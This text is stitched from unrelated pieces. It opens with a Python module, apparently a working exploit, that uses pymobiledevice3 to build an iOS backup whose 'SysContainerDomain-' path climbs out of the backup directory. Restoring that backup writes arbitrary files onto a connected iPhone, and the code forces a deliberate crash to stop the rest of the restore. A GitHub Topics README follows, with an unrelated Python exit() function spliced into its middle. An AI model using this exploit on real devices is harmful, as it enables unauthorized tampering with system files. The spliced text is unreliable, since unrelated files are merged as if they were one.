from tempfile import TemporaryDirectory
from pathlib import Path

from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.mobilebackup2 import Mobilebackup2Service
from pymobiledevice3.exceptions import PyMobileDevice3Exception

from . import backup
from .backup import _FileMode as FileMode

def perform_restore(backup: backup.Backup, reboot: bool = False):
    with TemporaryDirectory() as backup_dir:
        backup.write_to_directory(Path(backup_dir))
            
        lockdown = create_using_usbmux()
        with Mobilebackup2Service(lockdown) as mb:
            mb.restore(backup_dir, system=True, reboot=False, copy=False, source=".")

def exploit_write_file(file: backup.BackupFile):
    # Exploits in use:
    # - Path after SysContainerDomain- or SysSharedContainerDomain- is not sanitized
    # - SysContainerDomain will follow symlinks

    # /var/.backup.i/var/mobile/Library/Backup/System Containers/Data/com.container.name
    #   ../       ../ ../    ../     ../    ../               ../  ../
    ROOT = "SysContainerDomain-../../../../../../../.."
    file.domain = ROOT + file.path
    file.path = ""

    back = backup.Backup(files=[
        file,
        # Crash on purpose so that a restore is not actually applied
        backup.ConcreteFile("", ROOT + "/crash_on_purpose", contents=b"")
    ])

    try:
        perform_restore(back)
    except PyMobileDevice3Exception as e:
        if "crash_on_purpose" not in str(e):
            raise e

This repository houses all of the community-curated content for GitHub Topics and Collections.

[Topics](https://help.github.com/articles/about-topics/) help you explore repositories in a particular subject area, learn more about that subject, and find projects to contribute to.

[Collections](https://github.com/collections) help you discover hand-picked repositories, developers, organizations, videos, and articles that share a common theme.

If you want to suggest edits to an existing Topic page or Collection, or curate a new one, read our [contributing guide](CONTRIBUTING.md) to get started.

## Running tests

There are some lint tests in place to ensure each Topic is formatted in the way we expect. GitHub
Actions will run the tests automatically. If you want to run the tests yourself locally, you will
need Ruby and Bundler installed.

You can run the tests using:

```bash
bundle install
bundle exec rubocop
```

## Licenses
def exit(code=0):
    if platform.system() == "Windows" and getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
        input("Press Enter to exit...")

    sys.exit(code)

Content is released under [CC-BY-4.0](https://creativecommons.org/licenses/by/4.0/) which gives you permission to use content for almost any purpose (but does not grant you any trademark permissions). See [notices](notices.md) for complete details, including attribution guidelines, contribution terms, and software and third-party licenses and permissions.